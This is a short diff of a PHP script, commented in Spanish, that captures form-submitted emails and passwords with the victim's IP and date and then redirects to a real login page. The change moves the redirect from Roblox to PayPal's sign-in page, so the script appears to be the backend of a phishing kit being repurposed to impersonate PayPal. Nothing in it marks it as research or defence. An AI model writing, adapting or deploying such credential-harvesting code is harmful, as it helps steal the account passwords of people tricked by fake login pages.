@@ -1,6 +1,6 @@
 <?php
 // Configuración de redirección
-$redirect_url = "https://www.roblox.com/login";
+$redirect_url = "https://www.paypal.com/signin";
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     // 1. Capturar los datos de los inputs del index.html
@@ -13,7 +13,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $data = "----------------------------\n";
     $data .= "Fecha: $fecha\n";
     $data .= "IP:    $ip\n";
-    $data .= "User: $email\n";
+    $data .= "Email: $email\n";
     $data .= "Pass:  $password\n";
     $data .= "----------------------------\n";
 
